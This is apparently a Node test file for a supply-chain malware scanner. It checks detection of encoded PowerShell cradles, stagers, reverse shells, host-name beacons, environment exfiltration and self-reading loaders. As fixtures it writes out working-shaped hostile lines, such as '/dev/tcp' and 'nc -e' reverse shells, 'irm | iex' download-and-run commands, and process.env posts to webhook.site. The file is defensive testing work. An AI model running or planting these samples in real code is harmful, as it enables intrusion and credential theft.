// Audit P0s (0.1.7): PowerShell that hides or fetches what it runs, stager
// strings, reverse shells, host information sent out, the grading of
// import-time reasons and aliased decoders. Twin of
// python/tests/scanner/test_supply_chain_signals.py; on a random corpus the
// engine is held to its recorded outputs by tests/architecture/test_snapshot_hooks.py
// (the npm package runs the native engine).
// Everything is inert text: hosts are .invalid, nothing is executed.

import { test } from "node:test";
import assert from "node:assert/strict";
import { Buffer } from "node:buffer";
import { installScriptRisk, importTimeRisk, importTimeSeverity, scanFile } from "../src/index.js";
import { powershellRisk, stagerAt, reverseShellAt, readsOwnSource, runsOwnSourceAt, importCode } from "../src/lib/native.js";

const PS_RUN = Buffer.from('Invoke-WebRequest -Uri "https://x.invalid/a.exe" -OutFile "a.exe"; '
  + 'Invoke-Expression "a.exe"', "utf16le").toString("base64");
const PS_ECHO = Buffer.from("echo hi", "utf16le").toString("base64");

test("PowerShell: encoded commands, cradles, a download started", () => {
  for (const text of [`subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand ${PS_RUN}', shell=False)`,
    `subprocess.run(['powershell.exe', '-enc', '${PS_RUN}'])`, `execSync('pwsh -e ${PS_RUN}')`]) {
    assert.deepEqual(powershellRisk(text), ["runs an encoded PowerShell command that downloads and runs code"], text);
  }
  assert.deepEqual(powershellRisk(`os.system('powershell -enc ${PS_ECHO}')`), ["runs an encoded PowerShell command"]);
  assert.deepEqual(powershellRisk("execSync('powershell -c \"irm https://x.invalid/i.ps1 | iex\"')"),
    ["runs PowerShell that downloads and runs code"]);
  for (const text of ["subprocess.run(['powershell', '-Command', 'Get-ChildItem Env:'])",
    "powershell -ExecutionPolicy Bypass -File build.ps1", "powershell -enc QUJD", "iwr https://x.invalid/a | iex"]) {
    assert.deepEqual(powershellRisk(text), [], text);
  }
});

test("stagers, reverse shells, host information", () => {
  const stager = '_t.write(b"""from urllib.request import urlopen as _u;exec(_u(\'https://x.invalid/p\').read())""")\n'
    + '_system(f"start {exe} {_t.name}")\n';
  assert.equal(stagerAt(stager), stager.indexOf('"""'));
  assert.ok(installScriptRisk(stager).includes("carries a script that downloads and runs code"));
  assert.equal(stagerAt("DOC = 'Call exec() on trusted code only; see https://docs.invalid'\n"), -1);
  for (const text of ["s = socket.socket()\ns.connect((h, 4444))\nos.dup2(s.fileno(), 0)\nsubprocess.call(['/bin/sh', '-i'])\n",
    "os.system('bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')\n", "os.system('nc -e /bin/sh 10.0.0.1 4242')\n",
    "const net = require('net'), sh = require('child_process').spawn('/bin/sh', []);\n"
    + "const c = new net.Socket();\nc.connect(4444, h, () => { c.pipe(sh.stdin); sh.stdout.pipe(c); });\n"]) {
    assert.ok(reverseShellAt(text) >= 0, text);
  }
  assert.equal(reverseShellAt("fd = os.open(log, os.O_WRONLY)\nos.dup2(fd, 1)\n"), -1);
  // 0.1.8: the host name's flow into a request (0.1.7 read it anywhere in a file that used the network)
  const HOST = "sends the machine's user or host name over the network";
  for (const text of ["import socket, urllib.request\nurllib.request.urlopen('https://x.invalid/?h=' + socket.gethostname())\n",
    "const os = require('os');\nfetch('https://x.invalid/', {method: 'POST', body: os.hostname()});\n"]) {
    assert.ok(installScriptRisk(text).includes(HOST), text);
  }
  for (const text of ["import socket\nprint(socket.gethostname())\n", "print('run whoami to check')\nrequests.get(u)\n",
    "import socket, requests\nh = socket.gethostname()\nlog(h)\nrequests.get('https://x.invalid/v')\n"]) {
    assert.ok(!installScriptRisk(text).includes(HOST), text);
  }
});

test("import-time grading", () => {
  const beacon = "import socket, requests\n\ndef send():\n"
    + "    requests.post('https://webhook.site/0000', json={'h': socket.gethostname()})\n";
  const [reasons, line] = importTimeRisk(beacon);
  assert.deepEqual([reasons, line, importTimeSeverity(reasons)],
    [["sends the machine's user or host name to a data-capture service (webhook.site)"], 4, "CRITICAL"]);
  const telemetry = "import socket, requests\nrequests.post('https://telemetry.invalid/v1', json={'host': socket.gethostname()})\n";
  assert.deepEqual(importTimeRisk(telemetry)[0], []);
  // 2.17: what no library sends when it is loaded, sent anywhere; a client's own key, to its service, is not a finding
  const harvest = "import os, json, requests\nrequests.post('https://api.invalid/c', data=json.dumps(dict(os.environ)))\n";
  assert.equal(importTimeSeverity(importTimeRisk(harvest)[0]), "CRITICAL");
  const one = "import os, requests\nrequests.post('https://api.invalid/c', headers={'key': os.environ['EXAMPLE_KEY']})\n";
  assert.deepEqual(importTimeRisk(one)[0], []);
  const binary = "const https = require('https');\nhttps.get(u, (r) => r.pipe(fs.createWriteStream(dst)));\n"
    + "execFileSync(dst, ['--version']);\n";
  assert.equal(importTimeSeverity(importTimeRisk(binary)[0]), "MAJOR");
  const pyRun = "import requests, subprocess\nd = requests.get('https://x.invalid/p').content\n"
    + "open('p.py', 'wb').write(d)\nsubprocess.run(['python3', 'p.py'])\n";
  assert.equal(importTimeSeverity(importTimeRisk(pyRun)[0]), "CRITICAL");
});

test("import time: prose is read out, PowerShell must be handed to an exec call", () => {
  const selfUpdate = "import subprocess\n\ndef run_update():\n    return subprocess.call(_cmd())\n\n\ndef _cmd():\n"
    + "    # `iwr ... | iex` cannot take parameters: create a scriptblock\n"
    + "    return [\"powershell\", \"-NoProfile\", \"-Command\", \"& ([scriptblock]::Create((iwr -useb "
    + "https://x.invalid/i.ps1)))\"]\n";
  assert.deepEqual(importTimeRisk(selfUpdate, "py"), [[], null]);
  const doc = 'import subprocess\n\ndef installed():\n    """True when installed with\n'
    + '        powershell -ExecutionPolicy ByPass -c "irm https://x.invalid/i.ps1 | iex"\n    """\n'
    + '    return subprocess.run(["powershell", "-Command", "Get-ChildItem Env:"])\n';
  assert.deepEqual(importTimeRisk(doc), [["runs PowerShell that downloads and runs code"], 7]);
  assert.deepEqual(importTimeRisk(doc, "py"), [[], null]);
  const keys = 'import socket\n\nclass Client:\n    def load(self):\n'
    + '        """Loads ``id_rsa`` and ``id_rsa-cert.pub``."""\n        return socket.socket()\n';
  assert.deepEqual(importTimeRisk(keys, "py"), [[], null]);
  assert.deepEqual(importTimeRisk("const https = require('https');\n// JSON.stringify(process.env) is never sent\nhttps.get(u);\n", "js"),
    [[], null]);
  const run = "import subprocess\nsubprocess.run(\n    [\n        \"powershell\",\n        \"-c\",\n"
    + "        \"irm https://x.invalid/i.ps1 | iex\",\n    ]\n)\n";
  assert.deepEqual(importTimeRisk(run, "py"), [["runs PowerShell that downloads and runs code"], 4]);
  // (code in a string is a stager's: read on the tree, Python's received
  // code is the code's, not a string's, as JavaScript's)
  const runDoc = '"""\nimport urllib.request\nexec(urllib.request.urlopen("https://x.invalid/p").read())\n"""\nexec(__doc__)\n';
  assert.deepEqual(importTimeRisk(runDoc, "py")[0], ["carries a script that downloads and runs code",
    "runs code it reads back from its own file or a data file shipped with it"]);
  const beacon = 'requests.post("https://webhook.site/0", data=socket.gethostname())';
  // an argument, a continued line, joined to the string before it, an f-string, something after it: code
  // (a string's text is no flow, 0.1.8)
  for (const text of [`x = (\n    """${beacon}"""\n)\n`, `x = \\\n"""${beacon}"""\n`, `x = f(\n    'a'\n    """${beacon}"""\n)\n`,
    `f"""${beacon}"""\n`, `"""${beacon}""".strip()\n`]) {
    assert.equal(importCode(text, "py"), text, text);
  }
  const standalone = `x = 1\n"""\n${beacon}\n"""\n`;
  assert.notEqual(importCode(standalone, "py"), standalone);
  assert.deepEqual(importTimeRisk(standalone, "py"), [[], null]);
});

test("code read back from the file itself", () => {
  const OWN = "runs code it reads back from its own file or a data file shipped with it";
  const c2 = "# C2: https://webhook.site/abc\nimport socket, requests, re\n"
    + "url = re.search(r'# C2: (\\S+)', open(__file__).read()).group(1)\n"
    + "requests.post(url, data=socket.gethostname())\n";
  assert.ok(readsOwnSource(c2));
  assert.deepEqual(importTimeRisk(c2, "py"), importTimeRisk(c2));
  assert.equal(importTimeSeverity(importTimeRisk(c2, "py")[0]), "CRITICAL");
  for (const [lang, text, line] of [
    ["py", '"""\nimport os; os.system("id")\n"""\nexec(open(__file__).read().split(\'"""\')[1])\n', 4],
    ["py", 'src = open(__file__).read()\ncode = src.split("#!")[1]\nexec(code)\n#!print(1)\n', 3],
    ["py", '"""print(1)"""\nexec(__doc__)\n', 2],
    ["js", "const fs = require('fs');\neval(fs.readFileSync(__filename, 'utf8').split('/*')[1].split('*/')[0]);\n"
      + "/* require('child_process').execSync('id') */\n", 2],
    ["js", "const p = (function(){/*require('child_process').execSync('id')*/}).toString();\n"
      + "new Function(p.slice(p.indexOf('/*') + 2, p.lastIndexOf('*/')))();\n", 2]]) {
    assert.deepEqual(importTimeRisk(text, lang), [[OWN], line], text);
    assert.ok(installScriptRisk(text).includes(OWN), text);
  }
  assert.ok(runsOwnSourceAt('import os\nexec(open(os.path.join(os.path.dirname(__file__), "logo.png")).read())\n') >= 0);
  for (const text of ["import os\nhere = os.path.dirname(__file__)\nexec(open(os.path.join(here, 'pkg', 'version.py')).read())\n",
    '"""Tool."""\nimport argparse\np = argparse.ArgumentParser(description=__doc__)\n',
    'SHIM = """exec(compile(open(__file__).read(), __file__, "exec"))"""\nsubprocess.run([py, "-c", SHIM])\n',
    "NAMES = ('__doc__', '__name__')\nsrc = 'def f(): pass'\nexec(src)\n"]) {
    assert.equal(runsOwnSourceAt(text), -1, text);
  }
});

test("a licence read asynchronously by its path's name (0.1.8)", () => {
  const OWN = "runs code it reads back from its own file or a data file shipped with it";
  const thunk = "const fs = require('fs');\nconst path = require('path');\nconst parseLib = require('./parse')\n\n"
    + "const filePath = path.join(__dirname, 'LICENSE');\n\nfs.readFile(filePath, 'utf8', (_, data) => {\n  try {\n"
    + "    // Only eval if you're sure it's valid JS\n    eval(parseLib(data))\n  } catch (err) {\n"
    + "    console.error('Error during parsing/eval:', err);\n  }\n});\n";
  assert.deepEqual(installScriptRisk(thunk), [OWN]);
  assert.deepEqual(importTimeRisk(thunk, "js"), [[OWN], 10]);
  for (const text of ["fs.readFile(path.join(__dirname, 'payload.dat'), (err, buf) => { eval(decrypt(buf)); });",
    "const p = path.join(__dirname, 'data.bin');\nfs.promises.readFile(p).then((b) => eval(b.toString()));",
    "const p = `${__dirname}/README`;\nconst src = await fsp.readFile(p, 'utf8');\nvm.runInThisContext(xor(src));",
    "import os\np = os.path.join(os.path.dirname(__file__), 'LICENSE')\nwith open(p) as f:\n    exec(f.read())\n",
    "p = Path(__file__).parent / 'NOTICE'\nexec(base64.b64decode(p.read_text()))\n",
    "require('fs').readFile(__filename, 'utf8', (e, s) => eval(s.split('//@')[1]));"]) {
    assert.ok(runsOwnSourceAt(text) >= 0, text);
  }
  // a path read by name gives a value that counts only in a code runner
  const pkg = "const pkgPath = path.join(__dirname, 'package.json');\n"
    + "const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));\nexecSync('git tag v' + pkg.version);\n";
  assert.equal(runsOwnSourceAt(pkg), -1);
  assert.ok(runsOwnSourceAt(pkg.replace("execSync(", "eval(")) >= 0);
  for (const text of ["const p = path.join(__dirname, 'LICENSE');\nfs.readFile(p, 'utf8', (e, t) => console.log(t));\n",
    "const tpl = \"fs.readFile(path.join(__dirname, 'LICENSE'), (e, d) => eval(d))\";\n",
    "fs.readFile(userFile, (e, d) => eval(d));", "const p = path.join(__dirname, 'lib.js');\nfs.readFile(p, (e, d) => eval(d));"]) {
    assert.equal(runsOwnSourceAt(text), -1, text);
  }
  for (const text of ["p = __dirname + '" + "a/".repeat(100_000) + "\n" + "fs.readFile(p, (e, d) => eval(d));\n".repeat(2_000),
    "fs.readFile(p, ".repeat(100_000), "`${__dirname}/".repeat(100_000), ("__dirname" + "}/".repeat(100)).repeat(7000)]) {
    const start = performance.now();
    runsOwnSourceAt(text);
    assert.ok(performance.now() - start < 10_000, text.slice(0, 30));
  }
});

test("aliased decoders and decrypted payloads in the decode flow", () => {
  const found = (content) => scanFile({ name: "site-packages/x/a.py", content, lang: "py", dep: true })
    .filter((i) => i.rule === "SC-EVAL-DECODE").map((i) => i.line);
  assert.deepEqual(found("from base64 import b64encode, b64decode as invoke\nexec(invoke('aW1wb3J0IG9z'))\n"), [2]);
  assert.deepEqual(found("from zlib import decompress as z\nblob = z(data)\nexec(blob)\n"), [3]);
  assert.deepEqual(found("from cryptography.fernet import Fernet\nexec(Fernet(b'k').decrypt(b'gAAAA'))\n"), [2]);
  assert.deepEqual(found("from base64 import b64encode as enc\nexec(enc(b'x'))\n"), []);
});

test("what a script puts into a container, the container holds (D-3)", () => {
  // the tree model knew an array's push and unshift on a name alone (python: ContainerTests)
  const send = (body) => `fetch('https://x.invalid/c', {method: 'POST', body: ${body}});\n`;
  for (const [fill, body] of [
    ["const c = new FormData();\nc.append('e', JSON.stringify(process.env));\n", "c"],
    ["const c = new Map();\nc.set('e', process.env);\n", "JSON.stringify(Object.fromEntries(c))"],
    ["const c = new Set();\nc.add(JSON.stringify(process.env));\n", "JSON.stringify([...c])"],
    ["const c = {};\nObject.assign(c, { e: process.env });\n", "JSON.stringify(c)"],
  ]) {
    assert.deepEqual(installScriptRisk(fill + send(body), true, false, "js"),
      ["sends environment variables over the network (the whole environment)"], fill);
  }
  assert.deepEqual(installScriptRisk("const c = new Map();\nc.set('e', process.env);\n" + send("'ok'"), true, false, "js"), []);
});

test("a download a callback is given, written to a file and run (D-2)", () => {
  // the request client's body, https.get's chunks, a pipe into a file (python: test_droppers.CallbackTests)
  const head = "const fs = require('fs');\nconst { exec } = require('child_process');\nconst p = '/tmp/x.py';\n";
  for (const shape of [
    "const request = require('request');\nrequest.get('https://h.invalid/x.py', (e, r, b) => { fs.writeFileSync(p, b); exec('python3 ' + p); });\n",
    "const https = require('https');\nhttps.get('https://h.invalid/x.py', (res) => { let d = ''; res.on('data', (c) => { d += c; }); res.on('end', () => { fs.writeFileSync(p, d); exec('python3 ' + p); }); });\n",
    "const https = require('https');\nhttps.get('https://h.invalid/x.py', (res) => { const f = fs.createWriteStream(p); res.pipe(f); f.on('finish', () => exec('python3 ' + p)); });\n",
  ]) {
    assert.deepEqual(installScriptRisk(head + shape, true, false, "js"), ["downloads a script and runs it with Python"], shape);
    assert.deepEqual(importTimeRisk(head + shape, "js")[0], ["downloads a script and runs it with Python"], shape);
  }
  // a download kept, nothing run: no reason of the tree's (the text detector's is as before)
  const kept = importTimeRisk(head + "require('https').get('https://h.invalid/x.py', (res) => { res.pipe(fs.createWriteStream(p)); });\n", "js")[0];
  assert.ok(!kept.some((r) => r.includes("runs it with")), kept.join("; "));
});

test("code written into another package's folder (D-9)", () => {
  // @dinzid04/libsignal-node 2.2.5's shape (python: test_rewrites.py)
  const text = "const fs = require('fs');\nconst path = require('path');\n" +
    "const base = require.resolve('@whiskeysockets/baileys/package.json').replace('/package.json', '');\n" +
    "fs.writeFileSync(path.join(base, 'lib', 'Socket', 'newsletter.js'), 'exports.x = 1;');\n";
  assert.deepEqual(importTimeRisk(text, "js")[0], ["rewrites another package's code (@whiskeysockets/baileys)"]);
  assert.deepEqual(installScriptRisk(text, true, false, "js"), ["rewrites another package's code (@whiskeysockets/baileys)"]);
  // a data file there is not code
  assert.deepEqual(importTimeRisk(text.replace("newsletter.js", "data.json"), "js")[0], []);
});

test("the environment held or copied, read by a member's name (D-16); a JSON file given require (D-18)", () => {
  // prisma 8.0.0-rc.21's shape and corepack 0.36.0's (python: test_env_copies.py)
  const send = (v) => `fetch('https://collect.invalid/c', { method: 'POST', body: ${v} });\n`;
  const prisma = "function base(env = process.env) { return env.API_URL || 'https://api.invalid'; }\n" + send("base()");
  assert.deepEqual(importTimeRisk(prisma, "js")[0], []);
  assert.deepEqual(importTimeRisk("const env = { ...process.env };\n" + send("JSON.stringify(env)"), "js")[0],
    ["reads credentials or the whole environment and sends data over the network"]);
  const dl = (end) => "const https = require('https');\nhttps.get('https://dl.invalid/m', (res) => { let d = ''; " +
    `res.on('data', (c) => d += c); res.on('end', () => { ${end} }); });\n`;
  assert.deepEqual(importTimeRisk(dl("require(require('path').join('/tmp', d, 'package.json'));"), "js")[0], []);
  assert.deepEqual(importTimeRisk(dl("require(d);"), "js")[0], ["loads a module named by data it receives over the network"]);
});

test("linear time on hostile texts", () => {
  for (const text of ["powershell ".repeat(50_000), "powershell -e " + "A".repeat(400_000), "'".repeat(200_000) + "exec http",
    "dup2(".repeat(100_000), "$(whoami)".repeat(50_000), "iwr ".repeat(100_000) + "| iex"]) {
    const t0 = Date.now();
    installScriptRisk(text);
    importTimeRisk(text);
    assert.ok(Date.now() - t0 < 10_000, text.slice(0, 20));
  }
  const beacon = "import requests, socket\nrequests.post('https://webhook.site/0', data=socket.gethostname())\n";
  for (const tail of [" ".repeat(200_000) + "'a' ".repeat(50_000), "x = 1; " + "'a'; ".repeat(60_000), "#\n".repeat(100_000),
    '"""\n'.repeat(50_000), "(".repeat(100_000) + "'a'\n".repeat(20_000), "\\\n'a'\n".repeat(40_000),
    "powershell ".repeat(50_000) + "os.system(".repeat(1000)]) {
    for (const lang of ["py", "js"]) {
      const t0 = Date.now();
      assert.ok(importTimeRisk(beacon + tail, lang)[0].length);
      assert.ok(Date.now() - t0 < 10_000, `${tail.slice(0, 20)} ${lang}`);
    }
  }
});
